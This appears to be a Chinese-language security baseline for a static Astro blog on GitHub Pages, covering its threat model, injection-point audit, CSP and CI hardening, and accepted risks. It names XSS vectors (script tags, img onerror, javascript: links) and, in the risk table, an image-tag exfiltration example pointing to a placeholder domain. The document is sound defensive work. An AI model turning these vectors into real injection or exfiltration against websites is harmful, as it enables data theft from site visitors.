# 安全基线（Security Baseline）

> 明志博客（minimal-blog）安全审查与加固记录（v1.4.0）。本文档定义威胁模型、攻击面审计结论、已加固项与已知边界。
> 修改安全相关代码（CSP/头/CI 权限/依赖）前先读本文档。

## 1. 威胁模型

本博客是 **Astro 7 静态站 + GitHub Pages**：无服务器端代码、无数据库、无用户输入持久化、无登录态、无 cookie——传统 Web 攻击面（SQL 注入、SSRF、命令注入、会话劫持）不适用。

**核心假设：文章内容可信**。Markdown 中的 raw HTML（`<script>`、`<img onerror>` 等）会被 Astro **原样透传**（这是 Astro 的设计特性，非漏洞）。内容源是站长本人 + Git 受控 PR 流程（main 分支需审查）。**若未来引入不可信内容源（自动抓取、用户投稿），必须加 rehype-sanitize 白名单清洗，本假设即失效。**

## 2. 攻击面审计结论（v1.4.0 实证）

| 注入点 | 行为 | 结论 |
|---|---|---|
| frontmatter title/description/tags | Astro 模板表达式**自动 HTML 转义**（`<script>` → `&lt;script&gt;`，引号 → `&quot;`） | ✅ 安全 |
| 搜索索引（v1.3.0） | 结果渲染用 `textContent`（非 innerHTML）；`serializeIndexForHtml` 全量转义 `<`（`</script>`/`<!--` 均失效），端到端 jsdom 测试覆盖注入链路 | ✅ 安全 |
| Markdown 正文 raw HTML | **原样透传**（`<script>`/`img onerror`/`iframe`/`div onmouseover` 可执行） | ⚠️ 设计特性，见威胁模型 |
| Markdown `[链接](javascript:...)` | 原样输出 `href="javascript:..."` | ⚠️ 内容可信范围 |
| 代码块（shiki） | 代码内容纯文本转义 | ✅ 安全 |
| i18n 占位符替换 | `replaceAll` 无 HTML 注入 | ✅ 安全 |

> ⚠️ CSP 覆盖边界（内容被污染场景）：`script-src` 只约束 `<script>` 元素——**事件属性（`<a onclick>`/`<img onerror>`）与 `javascript:` 链接点击执行 JS 不受 CSP 限制**，与注入 `<script>` 同量级风险（同源动作，无 cookie/敏感数据可窃取）。CSP 的实际防护面：阻断外部脚本加载、iframe/object/Worker 副载、XHR 数据外传（`connect-src 'self'`）、外部样式、base 篡改、表单外提。

## 3. 已加固项

### 3.1 客户端安全（src/layouts/Base.astro head）
- **meta CSP**：`default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; font-src 'self' data:; connect-src 'self'; frame-src 'none'; object-src 'none'; worker-src 'none'; base-uri 'self'; form-action 'self'`
  - 纵深防御：即使内容被注入脚本，**无法**加载外部脚本（script-src 'self'）、**无法** iframe/object/Worker 副载（frame-src/object-src/worker-src 'none'）、**无法** XHR 数据外传（connect-src 'self'）、**无法**改 base URI / 提交表单到外部
  - `font-src 'self' data:`：**data: 必需**——@fontsource/lato 被 Vite 构建为 data: URI 内联字体（线上实证 `font-src 'self'` 误伤 4 个字体加载）
  - `img-src 'self' data:` 已收紧（当前零外链图）；**引入外链图时按实际图床域加白名单**（如 `img-src 'self' data: https://img.example.com`），否则第三方图床可获访客 IP
  - `'unsafe-inline'` 必须保留：防闪烁脚本（首帧执行）+ Astro 内联小脚本（SearchDialog/VT）+ VT 内联 style（astro-xxxx 构建期随机）+ Shiki token 内联 style 属性
  - GitHub Pages 无法自定义 HTTP 头 → 用 `<meta http-equiv>`（浏览器支持除 frame-ancestors 外主要指令；Safari 15.4+ 支持 base-uri/form-action）
  - 已移除 `<meta name="generator">`（防框架精确版本指纹泄露）
- **meta referrer**：`no-referrer`——外链不泄露 Referer（隐私）
- **平台层**：GitHub Pages 强制 HTTPS + HSTS（`max-age=31556952` 实测）

### 3.2 CI/CD（.github/workflows/deploy.yml）
- **权限最小化（job 级）**：test 仅 `contents: read`；build 为 `contents: read + pages: write`（upload-pages-artifact 官方要求）；deploy 继承顶层 `contents: read + pages: write + id-token: write`（OIDC，无 PAT）——缩小供应链投毒爆炸半径
- **actions 全部 pin commit SHA**（checkout v4.4.0 / setup-bun v2.2.0 / upload-pages-artifact v3.0.1 / deploy-pages v4.0.5，注释保留精确版本）——防 tag 被移动后拉取被篡改代码
- checkout `persist-credentials: false`（本工作流无需 git 写凭据）
- `workflow_dispatch` 限制 `branches: [main]`（手动触发只能发布 main）
- 无 secrets 使用（仓库 secrets total_count=0 实证）

### 3.3 供应链与依赖
- `bun.lock` 锁定全部依赖；`bun install --frozen-lockfile`（CI）
- **`bunfig.toml` 显式声明 registry = registry.npmmirror.com**（lockfile 的 tarball URL 全部来自此镜像，显式化避免隐式依赖；完整性由 lockfile sha512 校验兜底）
- **npm audit：0 vulnerabilities**（v1.4.0 验证，临时 lockfile 方式）
- 依赖极简：astro / @fontsource/lato / jsdom(dev) / typescript(dev) / @astrojs/check(dev)

### 3.4 隐私
- **无任何跟踪脚本**（GA/统计均无，about 页有声明）
- 字体完全自托管（@fontsource/lato），无外链字体 CDN
- localStorage 仅存主题偏好（`mb-theme`），无敏感数据

## 4. 已知边界（接受的风险）

| 边界 | 说明 | 缓解 |
|---|---|---|
| meta CSP 的 `'unsafe-inline'` | 内容被注入的内联 `<script>` 可执行（同源）；事件属性（`onclick`/`onerror`）与 `javascript:` 链接执行也不受 CSP 限制 | 威胁模型"内容可信"；CSP 已阻断外部资源/数据外传/iframe/object/Worker |
| `img-src 'self' data:` 下的外传通道 | 注入 `<img src="https://任意域/?d=...">` 可携带少量数据出站（URL 长度受限） | 本站无 cookie/敏感数据，泄露面 ≈ 0；文档已记录 |
| 无法设置 `X-Content-Type-Options` / `X-Frame-Options` | GitHub Pages 不发这两个头，meta 无法替代 | 现代浏览器对 text/html 有默认防护；本站无 iframe 内嵌价值（无敏感操作，点击劫持风险低） |
| Markdown raw HTML / javascript: 链接 | 作者可写任意 HTML（含脚本与事件属性） | 内容可信假设（见 §1）；如引入不可信内容源必须加 sanitize |
| Dependabot 未启用 | 无自动依赖更新/漏洞提醒（v1.4.0 验证 vulnerability-alerts 404） | **待办：GitHub Settings → Code security 启用 Dependabot alerts + security updates**（免费零成本） |
| main 分支无保护规则 | 单人仓库推送直进 main，威胁模型假设的"PR 审查"实际未强制 | 单人阶段可接受；加协作者前启用分支保护（require PR） |
| 依赖源为 npmmirror 镜像 | 第三方镜像（有 sha512 校验兜底）；跨境可用性风险 | 已显式声明（bunfig.toml）；如需迁官方源：`bun install --registry=https://registry.npmjs.org` 重新生成 lockfile |

## 5. 维护约定

- 改安全相关代码（CSP 指令 / 响应头 / CI 权限 / 依赖）→ 更新本文档 §3 并跑 `npm audit`（临时 lockfile 方式：`%TEMP%` 复制 package.json → `npm i --package-lock-only` → `npm audit`）
- **升级 actions**：`git ls-remote https://github.com/<repo> refs/tags/vX.Y.Z^{}` 取 commit SHA → 更新 pin 与注释（`# vX.Y.Z`）→ 推送验证
- 新增依赖 → 确认来源与必要性，`bun.lock` 提交
- 新增不可信内容源 → 先读 §1 威胁模型，必须引入 sanitize 后修改本文档
- 引入外链图片 → 更新 CSP `img-src` 白名单（图床域）并同步本文档
- 安全回归：`bun run lint && bun run test && bun run build` 全绿 + 线上响应头/meta CSP 抽查（curl + grep http-equiv）
